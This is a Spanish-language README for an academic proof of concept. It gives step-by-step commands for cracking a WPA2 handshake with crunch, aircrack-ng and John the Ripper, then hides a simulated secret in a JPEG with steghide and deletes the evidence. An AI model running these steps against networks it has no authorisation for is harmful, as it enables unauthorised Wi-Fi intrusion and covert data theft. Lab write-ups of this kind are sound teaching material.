# 🔐 Auditoría de Redes & Esteganografía (PoC)

![Kali Linux](https://img.shields.io/badge/OS-Kali%20Linux-blue?style=for-the-badge&logo=kalilinux)
![Bash](https://img.shields.io/badge/Language-Bash-green?style=for-the-badge&logo=gnu-bash)
![Security](https://img.shields.io/badge/Security-WPA2-red?style=for-the-badge)

> **Proyecto Académico:** Demostración del ciclo de ataque completo: desde la generación de diccionarios personalizados y ruptura de hash WPA2, hasta la post-explotación ocultando datos sensibles en imágenes.

---

## 🛠️ Herramientas Utilizadas

* **Crunch:** Generación de diccionarios personalizados.
* **Aircrack-ng:** Suite de auditoría inalámbrica.
* **John the Ripper:** Cracking de contraseñas.
* **Steghide:** Esteganografía en archivos de imagen.

---

## 🚀 Fase 1: Generación de Diccionario (Crunch)

En lugar de utilizar listas de palabras estáticas, generamos un diccionario dinámico basado en los parámetros conocidos de la contraseña objetivo (8 dígitos numéricos).
```bash
# Sintaxis: crunch <min> <max> <caracteres> -o <salida>
# Genera todas las combinaciones posibles de 8 números (00000000 - 99999999)
crunch 8 8 0123456789 -o diccionario.txt
```

Esto asegura que la contraseña objetivo (`12345678`) esté incluida en el ataque.

---

## 🔓 Fase 2: Procesamiento y Cracking

### 1. Limpieza y Conversión

El archivo de captura `.cap` original contiene ruido. Extraemos el handshake limpio y lo convertimos a un formato que John the Ripper pueda entender.
```bash
# 1. Extraer el handshake (EAPOL) limpio
aircrack-ng -J handshake_limpio prueba_final-01.cap

# 2. Convertir .hccap a formato hash de texto
hccap2john handshake_limpio.hccap > hash.txt
```

### 2. Ataque de Fuerza Bruta

Lanzamos el ataque utilizando el diccionario numérico generado en la Fase 1.
```bash
# Ejecutar John usando la lista de palabras creada
john --wordlist=diccionario.txt hash.txt

# 👁️ Ver la contraseña encontrada
john --show hash.txt
```

**Resultado:** `proyecto:12345678`

---

## 🕵️ Fase 3: Esteganografía (Post-Explotación)

Simulamos la exfiltración de datos confidenciales. Usamos la contraseña hackeada (`12345678`) para ocultar un archivo secreto dentro de una imagen inocente (`evidencia.jpg`).

### 📥 Ocultar Información (Embedding)
```bash
# 1. Crear el archivo secreto simulado
echo "CONFIDENCIAL: Acceso al servidor Admin -> Pass: 998877" > secreto.txt

# 2. Incrustar el secreto en la imagen (usando la clave hackeada)
steghide embed -cf evidencia.jpg -ef secreto.txt -p 12345678

# 3. Eliminar evidencia original (Limpieza)
rm secreto.txt
```

### 📤 Recuperación (Prueba de Concepto)

Para verificar que el ataque fue exitoso y los datos persisten, extraemos la información de la imagen.
```bash
# Extraer datos ocultos usando la misma clave
steghide extract -sf evidencia.jpg -p 12345678

# Leer el mensaje recuperado
cat secreto.txt
```

---

## ⚠️ Disclaimer

Este repositorio es exclusivamente para fines educativos y de investigación académica. El uso de estas herramientas en redes sin autorización previa es ilegal.
